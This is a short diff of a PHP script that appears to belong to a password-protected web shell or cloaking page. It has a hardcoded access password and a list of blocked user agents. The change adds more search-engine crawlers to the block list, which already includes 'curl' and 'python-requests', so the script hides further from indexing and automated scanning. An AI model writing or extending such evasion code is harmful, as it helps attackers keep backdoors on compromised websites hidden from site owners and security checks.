@@ -7,7 +7,8 @@ $validPassword = 'Djaya3';
 $blockedUserAgents = [
     'Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit',
     'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp',
-    'YahooSeeker', 'bingbot', 'curl', 'python-requests/2.25.1', 'python-requests/2.31.0', 'python-requests'
+    'YahooSeeker', 'bingbot', 'curl', 'python-requests/2.25.1', 'python-requests/2.31.0', 'python-requests',
+    'exabot', 'Applebot', 'duckduckbot', 'facebot', 'Alexa Crawler'
 ];
 
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
